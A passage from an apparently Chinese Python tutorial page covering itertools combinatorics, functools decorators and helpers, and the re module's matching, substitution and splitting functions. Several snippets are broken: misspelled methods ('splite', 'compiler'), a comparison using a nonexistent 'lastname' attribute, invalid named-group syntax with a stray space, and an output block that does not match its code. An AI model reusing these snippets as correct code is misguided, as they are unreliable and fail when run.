# 从序列中取2个元素进行排列
for e in it.permutations('ABCD', 2):
    print(''.join(e), end=', ') # AB, AC, AD, BA, BC, BD, CA, CB, CD, DA, DB, DC,
print('\n---------')
# 从序列中取2个元素进行组合、元素不允许重复
for e in it.combinations('ABCD', 2):
    print(''.join(e), end=', ') # AB, AC, AD, BC, BD, CD,
print('\n---------')
# 从序列中取2个元素进行组合、元素允许重复
for e in it.combinations_with_replacement('ABCD', 2):
    print(''.join(e), end=', ') # AA, AB, AC, AD, BB, BC, BD, CC, CD, DD,

# 输出:
AC, AD, BC, BD,
---------
AA, AB, BA, BB,
---------
AB, AC, AD, BA, BC, BD, CA, CB, CD, DA, DB, DC,
---------
AB, AC, AD, BC, BD, CD,
---------
AA, AB, AC, AD, BB, BC, BD, CC, CD, DD,

</textarea>字符排列组合<textarea>
from itertools import permutations

### 对给定的一些字符串或者数字遍历他们的所有排列组合
example = 'abc'
result = permutations(example)       # 返回元祖列表
for answer in result:
    print(''.join(answer), end=' ')  # abc acb bac bca cab cba

# 组合
from itertools import combinations, combinations_with_replacement  # 不放回抽取和放回抽取
example = '1234'

print()
for answer in combinations(example, 3):                   # 从example变量中,任取3个字符进行组合。每个元素取出以后不放回
    print(''.join(answer), end=' ')  # 123 124 134 234

print()
for answer in combinations_with_replacement(example, 3):  # 从example的变量中,取出3个字符,每个字符取出来以后要放回
    print(''.join(answer), end=' ')  # 111 112 113 114 122 123 124 133 134 144 222 223 224 233 234 244 333 334 344 444

</textarea>
</div>

<div id="functools">
<h4>functools模块</h4><pre>
functools 模块中主要包含了一些函数装饰器和便捷的功能函数

import functools
print([e for e in dir(functools) if not e.startswith('_')])
# ['MappingProxyType', 'RLock', 'WRAPPER_ASSIGNMENTS', 'WRAPPER_UPDATES', 'WeakKeyDictionary', 'cmp_to_key', 'get_cache_token', 'lru_cache', 'namedtuple', 'partial', 'partialmethod', 'recursive_repr', 'reduce', 'singledispatch', 'total_ordering', 'update_wrapper', 'wraps']

functools.cmp_to_key(func)
将老式的比较函数(func)转换为关键字函数(key function)。在Python3中比较大小、排序都是基于关键字函数的,Python3不支持老式的比较函数。

@functools.lru_cache(maxsize=128, typed=False)
该函数装饰器使用LRU(最近最少使用)缓存算法来缓存相对耗时的函数结果,避免传入相同的参数重复计算。同时缓存并不会无限增长,不用的缓存会被释放
其中maxsize参数用于设置缓存占用的最大字节数,typed参数用于设置将不同类型的缓存结果分开存放。

@functools.total_ordering
这个类装饰器(作用类似于函数装饰器,只是它用于修饰类)用于为类自动生成比较方法。通常来说,开发者只要提供__lt__()、__le__()、__gt__()、__ge__()其中之一(最好能提供__eq__()方法),@functools.total_ordering装饰器就会为该类生成剩下的比较方法。

functools.partial(func, *args, **keywords)
该函数用于为func函数的部分参数指定参数值,从而得到一个转换后的函数,程序以后调用转换后的函数时,就可以少传入那些己指定值的参数。

functools.partialmethod(func, *args, **keywords)
该函数与上一个函数的含义完全相同,只不过该函数用于为类中的方法设置参数值。

functools.reduce(function, iterable[, initializer])
将初始值(默认为0,可由initializer参数指定)、迭代器的当前元素传入function函数,将计算出来的函数结果作为下一次计算的初始值、迭代器的下一个元素再次调用function函数……依此类推,直到迭代器的最后一个元素。

＠functools.singledispatch
该函数装饰器用于实现函数对多个类型进行重载。比如同样的函数名称,为不同的参数类型提供不同的功能实现。该函数的本质就是根据参数类型的变换,将函数转向调用不同的函数。

functools.update_wrapper(wrapper, wrapped, assigned=WRAPPER_ASSIGNMENTS, updated=WRAPPER_UPDATES)
对wrapper函数进行包装,使之看上去就像wrapped(被包装)函数。

@functools.wraps(wrapped, assigned=WRAPPER_ASSIGNMENTS, updated=WRAPPER_UPDATES)
该函数装饰器用于修饰包装函数,使包装函数看上去就像 wrapped 函数。
functools.update_wrapper和＠functools.wraps的功能是一样的,只不过前者是函数,因此需要把包装函数作为第一个参数传入;而后者是函数装饰器,因此使用该函数装饰器修饰包装函数即可,无须将包装函数作为第一个参数传入

</pre><textarea>
from functools import *
# 以初始值(默认为0)为x,以当前序列元素为y,x+y的和作为下一次的初始值
print(reduce(lambda x,y: x + y, range(5))) # 10
print(reduce(lambda x,y: x + y, range(6))) # 15
# 设初始值为10
print(reduce(lambda x,y: x + y, range(6), 10)) # 25
print('----------------')
class User:
    def __init__(self, name):
        self.name = name
    def __repr__(self):
        return 'User[name=%s' % self.name
# 定义一个老式的大小比较函数,User的name越长,该User越大
def old_cmp(u1 , u2):
    return len(u1.name) - len(u2.name)
my_data = [User('Kotlin'), User('Swift'), User('Go'), User('Java')]
# 对my_data排序,需要关键字参数(调用cmp_to_key将old_cmp转换为关键字参数
my_data.sort(key=cmp_to_key(old_cmp))
print(my_data)
print('----------------')
@lru_cache(maxsize=32)
def factorial(n):
    print('~~计算%d的阶乘~~' % n)
    if n == 1:
        return 1
    else:
        return n * factorial(n - 1)
# 只有这行会计算,然后会缓存5、4、3、2、1的解乘
print(factorial(5))
print(factorial(3))
print(factorial(5))
print('----------------')
# int函数默认将10进制的字符串转换为整数
print(int('12345'))
# 为int函数的base参数指定参数值
basetwo = partial(int, base=2)
basetwo.__doc__ = '将二进制的字符串转换成整数'
# 相当于执行base为2的int()函数
print(basetwo('10010'))
print(int('10010', 2))

# partialmethod() 与 partial() 函数的作用基本相似,区别只是 partial() 函数用于为函数的部分参数绑定值;而 partialmethod() 函数则用于为类中方法的部分参数绑定值
from functools import *
class Cell:
    def __init__(self):
        self._alive = False
    # @property装饰器指定该方法可使用属性语法访问
    @property
    def alive(self):
        return self._alive
    def set_state(self, state):
        self._alive = bool(state)
    # 指定set_alive()方法就是将set_state()方法的state参数指定为True
    set_alive = partialmethod(set_state, True)
    # 指定set_dead()方法就是将set_state()方法的state参数指定为False
    set_dead = partialmethod(set_state, False)
c = Cell()
print(c.alive)
# 相当于调用c.set_state(True)
c.set_alive()
print(c.alive)
# 相当于调用c.set_state(False)
c.set_dead()
print(c.alive)

# ＠total_ordering类装饰器的作用
from functools import *
#@total_ordering
class User:
    def __init__(self, name):
        self.name = name
    def __repr__(self):
        return 'User[name=%s' % self.name
    # 根据是否有name属性来决定是否可比较
    def _is_valid_operand(self, other):
        return hasattr(other, "name")
    def __eq__(self, other):
        if not self._is_valid_operand(other):
            return NotImplemented
        # 根据name判断是否相等(都转成小写比较、忽略大小写)
        return self.name.lower()  == other.lastname.lower()
    def __lt__(self, other):
        if not self._is_valid_operand(other):
            return NotImplemented
        # 根据name判断是否相等(都转成小写比较、忽略大小写)
        return self.lastname.lower() < other.lastname.lower()
# 打印被装饰之后的User类中的__gt__方法
print(User.__gt__)

# @singledispatch 函数装饰器的作用是根据函数参数类型转向调用另一个函数,从而实现函数重载的功能
from functools import *
@singledispatch
def test(arg, verbose):
    if verbose:
        print("默认参数为:", end=" ")
    print(arg)
# 限制test函数第一个参数为int型的函数版本
@test.register(int)
def _(argu, verbose):
    if verbose:
        print("整型参数为:", end=" ")
    print(argu)
test('Python', True)  # ①
# 调用第一个参数为int型的版本
test(20, True)  # ②

# 程序还可继续使用 ＠test.register() 装饰器来绑定被转向调用的函数
# 限制test函数第一个参数为list型的函数版本
@test.register(list)
def _(argb, verbose=False):
    if verbose:
        print("列表中所有元素为:")
    for i, elem in enumerate(argb):
        print(i, elem, end=" ")
test([20, 10, 16, 30, 14], True) # ③
print("\n---------------")

# 此外程序也可使用register(类型,被转向调用的函数)方法来执行绑定。这种方式与前面使用函数装饰器的本质是一样的,只不过这种语法没有修饰被转向调用的函数,因此额外多传入一个参数
print("\n---------------")
# 定义一个函数,不使用函数装饰器修饰
def nothing(arg, verbose=False):
    print("~~None参数~~")
# 当test函数第一个参数为None类型时,转向为调用nothing函数
test.register(type(None), nothing)
test(None, True) # ④
print("\n---------------")

# 此外＠singledispatch 也允许为参数的多个类型绑定同一个被转向调用的函数:只要使用多个＠函数名.register()装饰器即可
from decimal import Decimal
# 限制test函数第一个参数为float或Decimal型的函数版本
@test.register(float)
@test.register(Decimal)
def test_num(arg, verbose=False):
    if verbose:
        print("参数的一半为:", end=" ")
    print(arg / 2)

# 当程序为 ＠singledispatch 函数执行绑定之后,程序就可以通过该函数的 dispatch(类型)方法来找到该类型所对应转向的函数
# test.dispatch(类型)即可获取它转向的函数
# 当test()函数第一个参数为float时将转向到调用test_num
print(test_num is test.dispatch(float)) # True
# 当test()函数第一个参数为Decimal时将转向到调用test_num
print(test_num is test.dispatch(Decimal)) # True
# 直接调用test并不等于test_num
print(test_num is test) # False

# 此外,如果想访问 ＠singledispatch 函数所绑定的全部类型及对应的 dispatch 函数,则可通过该函数的只读属性 registry 来实现,该属性相当于一个只读的 dict对象
# 获取test函数所绑定的全部类型
print(test.registry.keys())
# 获取test函数为int类型绑定的函数
print(test.registry[int])

# @wraps(wrapped_func) 函数装饰器与 update_wrapper(wrapper, wrapped_func) 函数的作用是一样的,都用于让包装函数看上去就像被包装函数(主要就是让包装函数的 __name__、__doc__ 属性与被包装函数保持一致)。区别是 ＠wraps(wrapped_ func) 函数装饰器直接修饰包装函数,因此不需要传入包装函数作为参数;而 update_wrapper(wrapper, wrapped_func) 则需要同时传入包装函数、被包装函数作为参数
from functools import wraps
def fk_decorator(f):
    # 让wrapper函数看上去就像f函数
    @wraps(f)
    def wrapper(*args, **kwds):
        print('调用被装饰函数')
        return f(*args, **kwds)
    return wrapper
@fk_decorator
def test():
    """test函数的说明信息"""
    print('执行test函数')
test()
print(test.__name__)
print(test.__doc__)

</textarea>
</div>

<div id="regexp">
<h3>re模块 正则表达式(Regular Expression)</h3><pre>
正则表达式是一种用来匹配字符串的强有力的武器,它的设计思想是用一种描述性的语言来给字符串定义一个规则,凡是符合规则的字符串就认为它"匹配"了,否则该字符串就是不合法的

正则表达式用于描述一种字符串匹配的模式,它可用于检查一个字符串是否含有某个子串,也可用于从字符串中提取匹配的子串,或对字符串中匹配的子串执行替换操作

正则表达式是一个特殊的字符序列,它能帮助方便的检查一个字符串是否与某种模式匹配。
Python提供re模块,提供Perl风格的正则表达式模式,re模块使Python语言拥有全部的正则表达式功能。
compile函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象,该对象拥有一系列方法用于正则表达式匹配和替换。
re模块也提供了与这些方法功能完全一致的函数,这些函数使用一个模式字符串做为它们的第一个参数。

r 代表原始字符串,通过使用原始字符串,可以避免对字符串中的特殊字符进行转义
由于Python的字符串本身也用\转义,所以要特别注意:
s = 'ABC\\-001' # Python的字符串
# 对应的正则表达式字符串变成:'ABC\-001'

因此强烈建议使用Python的r前缀,就不用考虑转义的问题了:
s = r'ABC\-001' # Python的字符串
# 对应的正则表达式字符串不变:'ABC\-001'

</pre><textarea>
import re
print(re.__all__)
# ['match', 'fullmatch', 'search', 'sub', 'subn', 'split', 'findall', 'finditer', 'compile', 'purge', 'template', 'escape', 'error', 'A', 'I', 'L', 'M', 'S', 'X', 'U', 'ASCII', 'IGNORECASE', 'LOCALE', 'MULTILINE', 'DOTALL', 'VERBOSE', 'UNICODE']

</textarea><pre>
【 re.compile()编译 】
在Python中使用正则表达式时re模块内部会干两件事情:
1、编译正则表达式,如果正则表达式的字符串本身不合法会报错
2、用编译后的正则表达式去匹配字符串

如果一个正则表达式要重复使用几千次,出于效率的考虑,可以预编译该正则表达式,接下来重复使用时就不需要编译这个步骤了,可以直接匹配
编译后生成Regular Expression对象,由于该对象自己包含了正则表达式,所以调用对应的方法时不用给出正则字符串

re.compile(pattern[, flags=0])
compile函数用于编译正则表达式,生成一个正则表达式(Pattern)对象,供match()和search()这两个函数使用。
该函数用于将正则表达式字符串编译成_sre.SRE_Pattern对象,该对象代表了正则表达式编译之后在内存中的对象,它可以缓存并复用正则表达式字符串,所以具有更好的性能。如果程序需要多次使用同一个正则表达式字符串则可考虑先编译它。
该函数的pattern参数就是它所编译的正则表达式字符串,flags则代表了正则表达式的匹配旗标。编译得到的_sre.SRE_Pattern对象包含了re模块中绝大部分函数对应的方法

re.purge()
清除正则表达式缓存

flags具体参数为:
re.I 忽略大小写
re.L 表示特殊字符集 \w, \W, \b, \B, \s, \S 依赖于当前环境
re.M 多行模式
re.S 即为 . 并且包括换行符在内的任意字符(.不包括换行符)
re.U 表示特殊字符集 \w, \W, \b, \B, \d, \D, \s, \S 依赖于 Unicode 字符属性数据库
re.X 为了增加可读性,忽略空格和#后面的注释

</pre>先编译正则表达式,然后调用正则表达式的search()方法执行匹配<textarea>
#先编译正则表达式
p = re.compile('abc')
#调用_sre.SRE_Pattern对象的search()方法
p.search("www.abc.com")

# 等效于:
#直接用正则表达式匹配目标字符串
re.search('abc','www.abc.com')

</textarea>pattern.match()<textarea>
import re
# 编译
re_telephone = re.compile(r'^(\d{3})-(\d{3,8})$')
print(re_telephone)                              # re.compile('^(\\d{3})-(\\d{3,8})$')
# 使用
print(re_telephone.match('010-12345').groups())  # ('010', '12345')
print(re_telephone.match('010-8086').groups())   # ('010', '8086')

</textarea>pattern.sub()<textarea>
def filter_tags(htmlstr):
    htmlstr = ' '.join(htmlstr.splite())  # 去掉多余空格
    re_doctype = re.compiler(r'< !DOCTYPE .*?>', re.S)
    res = re_doctype.sub('', htmlstr)         # 过滤DOCTYPE
    return res

</textarea><textarea>
import re
pattern = re.compile(r'\d+')                     # 用于匹配至少一个数字
m = pattern.match('one12twothree34four')         # 查找头部,没有匹配
print(m)                                         # None
m = pattern.match('one12twothree34four', 2, 10)  # 从'e'的位置开始匹配,没有匹配
print(m)                                         # None

m = pattern.match('one12twothree34four', 3, 10)  # 从'1'的位置开始匹配,正好匹配
print(m)                                         # 返回一个Match对象 <_sre.SRE_Match object at 0x10a42aac0>
print(m.group(0))                                # 可省略0,输出:'12'
print(m.start(0))                                # 可省略0,输出:3
print(m.end(0))                                  # 可省略0,输出:5
print(m.span(0))                                 # 可省略0,输出:(3, 5)

</textarea><pre>
当匹配成功时返回一个Match对象,其中:
group([group1, …]) 方法用于获得一个或多个分组匹配的字符串,当要获得整个匹配的子串时可直接使用group()或group(0);
start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置(子串第一个字符的索引),参数默认值为 0;
end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置(子串最后一个字符的索引+1),参数默认值为 0;
span([group]) 方法返回(start(group), end(group))。

</pre><textarea>
>>>import re
>>> pattern = re.compile(r'([a-z]+) ([a-z]+)', re.I)   # re.I 表示忽略大小写
>>> m = pattern.match('Hello World Wide Web')
>>> print(m)                              # 匹配成功,返回一个 Match对象
<_sre.SRE_Match object at 0x10bea83e8>
>>> m.group(0)                            # 返回匹配成功的整个子串
'Hello World'
>>> m.span(0)                             # 返回匹配成功的整个子串的索引
(0, 11)
>>> m.group(1)                            # 返回第一个分组匹配成功的子串
'Hello'
>>> m.span(1)                             # 返回第一个分组匹配成功的子串的索引
(0, 5)
>>> m.group(2)                            # 返回第二个分组匹配成功的子串
'World'
>>> m.span(2)                             # 返回第二个分组匹配成功的子串
(6, 11)
>>> m.groups()                            # 等价于 (m.group(1), m.group(2), ...)
('Hello', 'World')
>>> m.group(3)                            # 不存在第三个分组
IndexError: no such group

</textarea><pre>
【 re.escape() 】
re.escape(pattern)
对模式中除ASCII字符、数值、下画线_之外的其他字符添加反斜线进行转义

</pre><textarea>
import re
# 对模式中特殊字符进行转义
print(re.escape(r'www.crazyit.org is good, i love it!')) # www\.crazyit\.org\ is\ good\,\ i\ love\ it\!
print(re.escape(r'A-Zand0-9?'))                          # A\-Zand0\-9\?

</textarea><pre>
【 re.match函数 】
re.match(pattern, string, flags=0)
尝试从字符串的开始位置来匹配正则表达式
其中pattern参数代表正则表达式;string代表被匹配的字符串;flags标志位则代表正则表达式的匹配旗标,用于控制正则表达式的匹配方式,如:是否区分大小写,多行匹配等。
如果从开始位置匹配不成功,match()函数就返回None,否则该函数返回_sre.SRE_Match对象,该对象包含的span(n)方法用于获取第n+1个组的匹配位置,group(n)方法用于获取第n+1个组所匹配的子串
match()方法判断是否匹配,如果匹配成功返回一个Match对象,否则返回None

可以使用匹配对象方法group(num)或groups()匹配对象函数来获取匹配表达式。
groups()
返回一个包含所有小组字符串的元组,从1到所含的小组号。
group(num=0)
匹配的整个表达式的字符串,group()可以一次输入多个组号,在这种情况下它将返回一个包含那些组所对应值的元组。

</pre><textarea>
import re
print(re.match('www', 'www.runoob.com').span())  # 在起始位置匹配,输出:(0, 3)
print(re.match('com', 'www.runoob.com'))         # 不在起始位置匹配,输出:None

print(re.match(r'^\d{3}\-\d{3,8}$', '010 12345'))         # None
print(re.match(r'^\d{3}\-\d{3,8}$', '010-12345'))         # <_sre.SRE_Match object; span=(0, 9), match='010-12345'>

test = '用户输入的字符串'
print('ok') if re.match(r'正则表达式', test) else print('failed')  # failed

</textarea><pre>
分组
除了简单地判断是否匹配之外,正则表达式还有提取子串的强大功能
用()表示的就是要提取的分组Group,如果正则表达式中没有圆括号,那么整个表达式就属于一个默认组
如果正则表达式中定义了组,就可以在Match对象上用group()方法提取出子串来,group(0)永远是原始字符串,group(1)、group(2)……表示第1、2、……个子串

m = re.match(r'^(\d{3})-(\d{3,8})$', '010-12345') # 分别定义了两个组,可以直接从匹配的字符串中提取出区号和本地号码
print(m)            # <_sre.SRE_Match object; span=(0, 9), match='010-12345'>

print(m.groups())   # ('010', '12345')
print(m.group(0))   # '010-12345'
print(m.group(1))   # '010'
print(m.group(2))   # '12345'

print(m.span(0))    # (0, 9)
print(m.span(1))    # (0, 3)
print(m.span(2))    # (4, 9)
print(m.span(3))    # IndexError: no such group

</pre><textarea>
line = "Cats are smarter than dogs"
matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I)

if matchObj:
   print("matchObj.group() : ", matchObj.group())
   print("matchObj.groups() : ", matchObj.groups())
   print("matchObj.group(1) : ", matchObj.group(1))
   print("matchObj.group(2) : ", matchObj.group(2))
else:
   print("No match!!")

# 输出:
matchObj.group() :  Cats are smarter than dogs
matchObj.groups() :  ('Cats', 'smarter')
matchObj.group(1) :  Cats
matchObj.group(2) :  smarter

</textarea><pre>
【 贪婪匹配 】
正则匹配默认是贪婪匹配,也就是匹配尽可能多的字符

# 匹配出数字后面的0
r = re.match(r'^(\d+)(0*)$', '102300').groups()
print(r)   # ('102300', '')
由于\d+采用贪婪匹配,直接把后面的0全部匹配了,结果0*只能匹配空字符串了

必须让\d+采用非贪婪匹配(也就是尽可能少匹配),才能把后面的0匹配出来,加个?就可以让\d+采用非贪婪匹配:
r = re.match(r'^(\d+?)(0*)$', '102300').groups()
print(r)   # ('1023', '00')

【 re.search方法 】
re.search(pattern, string, flags=0)
匹配成功re.search方法返回一个匹配的对象,否则返回None
re.search扫描整个字符串并返回第一个成功的匹配。
扫描整个字符串,并返回字符串中第一处匹配pattern的匹配对象。其中pattern参数代表正则表达式;string代表被匹配的字符串;flags则代表正则表达式的匹配旗标,标志位,用于控制正则表达式的匹配方式,如:是否区分大小写,多行匹配等。该函数也返回_sre.SRE_Match对象

可以使用匹配对象方法group(num)或groups()匹配对象函数来获取匹配表达式。

group(num=0)
匹配的整个表达式的字符串,group() 可以一次输入多个组号,在这种情况下它将返回一个包含那些组所对应值的元组。

groups()
返回一个包含所有小组字符串的元组,从 1 到 所含的小组号。

</pre><textarea>
import re
print(re.search('www', 'www.runoob.com').span())  # 在起始位置匹配
print(re.search('com', 'www.runoob.com').span())  # 不在起始位置匹配

# 以上实例运行输出结果为:
(0, 3)
(11, 14)

line = "Cats are smarter than dogs";
searchObj = re.search( r'(.*) are (.*?) .*', line, re.M|re.I)
if searchObj:
   print("searchObj.group() : ", searchObj.group())
   print("searchObj.group(1) : ", searchObj.group(1))
   print("searchObj.group(2) : ", searchObj.group(2))
else:
   print("Nothing found!!")

# 以上实例执行结果如下:
searchObj.group() :  Cats are smarter than dogs
searchObj.group(1) :  Cats
searchObj.group(2) :  smarter

</textarea><pre>
re.match与re.search的区别
match()与search()的区别在于,match()必须从字符串开始处就匹配,但search()可以搜索整个字符串
re.match只匹配字符串的开始,如果字符串开始不符合正则表达式则匹配失败,函数返回None;而re.search匹配整个字符串,直到找到一个匹配。
match()函数要求必须从字符串开始处匹配,而search()函数则可扫描整个字符串,从中间任意位置开始匹配

</pre><textarea>
import re
m1 = re.match('www', 'www.fkit.org')     # 开始位置可以匹配
print(m1.span())                         # span返回匹配的位置
print(m1.group())                        # group返回匹配的组
print(re.match('fkit', 'www.fkit.com'))  # 开始位置匹配不到,返回None

m2 = re.search('www', 'www.fkit.org')    # 开始位置可以匹配
print(m2.span())
print(m2.group())
m3 = re.search('fkit', 'www.fkit.com')   # 中间位置可以匹配,返回Match对象
print(m3.span())
print(m3.group())

# 输出:
(0, 3)
www
None
(0, 3)
www
(4, 8)
fkit

</textarea><textarea>
line = "Cats are smarter than dogs";
matchObj = re.match( r'dogs', line, re.M|re.I)
if matchObj:
   print("match --> matchObj.group() : ", matchObj.group())
else:
   print("No match!!")

matchObj = re.search( r'dogs', line, re.M|re.I)
if matchObj:
   print("search --> matchObj.group() : ", matchObj.group())
else:
   print("No match!!")

# 以上实例运行结果如下:
No match!!
search --> matchObj.group() :  dogs

</textarea><pre>
【 re.fullmatch() 】
re.fullmatch(pattem, string, flags=0)
该函数要求整个字符串能匹配pattern,如果匹配则返回包含匹配信息的_sre.SRE_Match对象,否则返回None

【 re.sub()检索和替换字符串中的匹配项 】
re.sub(pattern, replace, string, count=0, flags=0)
该函数用于将string字符串中所有匹配pattern的内容替换成replace;replace既可是被替换的字符串,也可是一个函数。count参数控制最多替换多少次,默认0表示替换所有的匹配

</pre><textarea>
import re

phone = "2004-959-559  # 这是一个国外电话号码"
# 删除字符串中的Python注释
print("电话号码是: ", re.sub(r'#.*$', "", phone))  # 电话号码是:  2004-959-559
# 删除非数字(-)的字符
print("电话号码是: ", re.sub(r'\D', "", phone))   # 电话号码是:  2004959559

my_date = '2008-08-18'
# 将my_date字符串里中画线替换成斜线
print(re.sub(r'-', '/', my_date))      # 2008/08/18
# 将my_date字符串里中画线替换成斜线,只替换一次
print(re.sub(r'-', '/', my_date, 1))   # 2008/08-18

</textarea>某些情况下所执行的替换要基于被替换内容进行改变,下面程序要将字符串中每个英文单词都变成一套教程的名字<textarea>
# 在匹配的字符串前后添加内容
def fun(matched):
    # matched就是匹配对象,通过该对象的group()方法可获取被匹配的字符串
    value = "《基础" + (matched.group('lang')) + "教程》"
    return value

# 将s里面的英文单词(用re.A旗标控制)进行替换,使用fun函数指定替换的内容
print(re.sub(r'(?P< lang>\w+)', fun, 'Python很好,Kotlin也很好', flags=re.A))
# 《基础Python教程》很好,《基础Kotlin教程》也很好

'''
r'(?P< lang>\w+)' 正则表达式用圆括号表达式创建了一个组,并使用"?P"选项为该组起名为 lang(所起的组名要放在尖括号内)。剩下的"\w+"才是正则表达式的内容,其中"\w"代表任意字符;"+"用于限定前面的"\w"可出现一次到多次,因此"\w+"代表一个或多个任意字符。又由于程序执行sub()函数时指定了re.A选项,这样"\w"就只能代表ASCII字符,不能代表汉字。

使用sub()替换时正则表达式"\w+"所匹配的内容可通过组名"lang"来获取,这样fun()就调用了matched.group('lang')来获取"\w+"所匹配的内容
'''

</textarea>replace参数是一个函数,以下实例中将字符串中的匹配的数字乘以2<textarea>
# 将匹配的数字乘以2
def double(matched):
    value = int(matched.group('value'))
    return str(value * 2)

print(re.sub('(?P< value>\d+)', double, 'A23G4HFD567'))  # A46G8HFD1134

</textarea><pre>
【 findall 】
在字符串中找到正则表达式所匹配的所有子串,并返回一个列表,如果没有找到匹配的,则返回空列表。
match和search是匹配一次,findall匹配所有。

re.findall(pattern, string, flags=0)
扫描整个字符串,并返回字符串中所有匹配pattern的子串组成的列表
参数pattern参数代表正则表达式;string代表被匹配的宇符串;flags则代表正则表达式的匹配旗标

findall(string[, pos[, endpos]])
string : 待匹配的字符串。
pos : 可选参数,指定字符串的起始位置,默认为 0。
endpos : 可选参数,指定字符串的结束位置,默认为字符串的长度。

</pre>查找字符串中的所有数字<textarea>
import re
pattern = re.compile(r'\d+')   # 查找1个或多个连续的数字
result1 = pattern.findall('runoob 123 google 456')
result2 = pattern.findall('run88oob123google456')
result3 = pattern.findall('run88oob123google456', 0, 10)
print(result1)  # ['123', '456']
print(result2)  # ['88', '123', '456']
print(result3)  # ['88', '12']

</textarea><pre>
【 re.finditer 】
re.finditer(pattern, string, flags=0)
和findall类似,区别在于返回值不同,findall()返回所有匹配patten的子串组成的列表;而finditer()则返回所有匹配pattern的子串组成的选代器
扫描整个字符串,并返回字符串中所有匹配pattern的子串组成的迭代器,迭代器的元素是_sre.SRE_Match对象
pattern参数代表正则表达式;string代表被匹配的字符串;flags则代表正则表达式的匹配旗标

</pre><textarea>
import re
it = re.finditer(r"\d+","12a32bc43jf3")
for match in it:
    print (match.group(), end=" ")     # 12 32 43 3

# 返回所有匹配pattern的子串组成的列表, 忽略大小写
print(re.findall('fkit', 'FkIt is very good , Fkit.org is my favorite' , re.I))  # ['FkIt', 'Fkit']
# 返回所有匹配pattern的子串组成的迭代器, 忽略大小写
it = re.finditer('fkit', 'FkIt is very good , Fkit.org is my favorite' , re.I)
for e in it:
    print(str(e.start()) + "-->" + e.group(), end=" ")                            # 0-->FkIt 20-->Fkit

</textarea><pre>
【 re.split 】
re.split(pattern, string[, maxsplit=0, flags=0])
使用pattern对string进行分割,该函数返回分割得到的多个子串组成的列表,其中maxsplit参数控制最多分割几次,分隔次数,maxsplit=1分隔一次,默认为0不限制次数。

</pre><textarea>
# 字符串的split方法无法识别连续的空格
'a b   c'.split(' ')                 # ['a', 'b', '', '', 'c']
re.split(r'\s+', 'a b   c')          # ['a', 'b', 'c']
re.split(r'[\s\,]+', 'a,b, c  d')    # ['a', 'b', 'c', 'd']
re.split(r'[\s\,\;]+', 'a,b;; c  d') # ['a', 'b', 'c', 'd']

re.split('\W+', 'runoob, runoob, runoob.')     # ['runoob', 'runoob', 'runoob', '']
re.split('(\W+)', ' runoob, runoob, runoob.')  # ['', ' ', 'runoob', ', ', 'runoob', ', ', 'runoob', '.', '']
re.split('\W+', ' runoob, runoob, runoob.', 1) # ['', 'runoob, runoob, runoob.']

# 使用逗号对字符串进行分割
print(re.split(', ', 'fkit, fkjava, crazyit'))    # ['fkit', 'fkjava', 'crazyit']
# 指定只分割1次,被切分成2个子串
print(re.split(', ', 'fkit, fkjava, crazyit', 1)) # ['fkit', 'fkjava, crazyit']
# 使用a进行分割
print(re.split('a', 'fkit, fkjava, crazyit'))     # ['fkit, fkj', 'va, crazyit']
# 使用x进行分割,没有匹配内容则不会执行分割
print(re.split('x', 'fkit, fkjava, crazyit'))     # ['fkit, fkjava, crazyit']
re.split('a*', 'hello world')                     # ['hello world']

</textarea>

<h4>正则表达式对象和匹配对象</h4><pre>
【 正则表达式对象 】
re模块中还包含两个类:正则表达式对象(其具体类型为_sre.SRE_Pattern)和匹配(Match)对象,其中正则表达式对象就是调用re.compile()函数的返回值,该对象的方法与re模块中的函数大致对应。

re.RegexObject
re.compile()返回RegexObject对象

re.MatchObject
group()返回被RE匹配的字符串。
start() 返回匹配开始的位置
end() 返回匹配结束的位置
span() 返回一个元组包含匹配 (开始,结束) 的位置

相比之下,正则表达式对象的search()、match()、fullmatch()、findall()、finditer()方法的功能更强大一些,因为这些方法都可额外指定pos和endpos两个参数,用于指定只处理目标字符串从pos开始到endpos结束之间的子串

</pre><textarea>
import re
# 编译得到正则表达式对象
pa = re.compile('fkit')
# 调用match方法,原本应该从开始匹配,此处指定从索引为4的地方开始匹配就可以成功匹配了
print(pa.match('www.fkit.org', 4).span())        # (4, 8)
# 此处指定从索引为4到索引6之间执行匹配,匹配失败
print(pa.match('www.fkit.org', 4, 6))            # None
# 此处指定从索引为4到索引8之间执行全匹配,匹配成功
print(pa.fullmatch('www.fkit.org', 4, 8).span()) # (4, 8)

</textarea><pre>
re模块中的Match对象(其具体类型为_sre.SRE_Match)则是match()、search()方法的返回值,该对象中包含了详细的正则表达式匹配信息,包括正则表达式匹配的位置、正则表达式所匹配的子串。

sre.SRE_Match对象包含了如下方法或属性:
match.group([group1,...]):获取该匹配对象中指定组所匹配的字符串。
match.__getitem__(g):这是match.group(g)的简化写法。由于match对象提供了__getitem__()方法,因此程序可使用match[g]来代替match.group(g)
match.groups(default=None):返回match对象中所有组所匹配的字符串组成的元组。
match.groupdict(default= None):返回match对象中所有组所匹配的字符串组成的字典。
match.start([group]):获取该匹配对象中指定组所匹配的字符串的开始位置。
match.end([group]):获取该匹配对象中指定组所匹配的宇符串的结束位置。
match.span([group]):获取该匹配对象中指定组所匹配的字符串的开始位置和结束位置。该方法相当于同时返回start()和end()方法的返回值。

只要正则表达式能匹配得到结果,则不管正则表达式是否包含组,group(0)、span(0)总能获得内容,因为它们分别是获取整个正则表达式所匹配的子串,以及该子串的开始位置和结束位置

match.pos:该属性返回传给正则表达式对象的search()、match()等方法的pos参数。
match.endpos:该属性返回传给正则表达式对象的search()、match()等方法的endpos参数。
match.lastindex:该属性返回最后一个匹配的捕获组的整数索引。如果没有组匹配,该属性返回 None。例如用(a)b、((a)(b))或((ab))对字符串'ab'执行匹配,该属性都会返回1;但如果使用(a)(b)正则表达式对'ab'执行匹配则lastindex等于2
match.lastgroup:该属性返回最后一个匹配的捕获组的名字;如果该组没有名字或根本没有组匹配,该属性返回None
match.re:该属性返回执行正则表达式匹配时所用的正则表达式。
match.string:该属性返回执行正则表达式匹配时所用的字符串。

</pre>正则表达式分组<textarea>
import re
# 在正则表达式中使用组
m = re.search(r'(fkit).(org)', r"www.fkit.org is a good domain")

print(m.group(0))   # fkit.org
# 调用简化写法,底层是调用m.__getitem__(0)
print(m[0])         # fkit.org
print(m.span(0))    # (4, 12)

print(m.group(1))   # fkit
# 调用简化写法,底层是调用m.__getitem__(1)
print(m[1])         # fkit
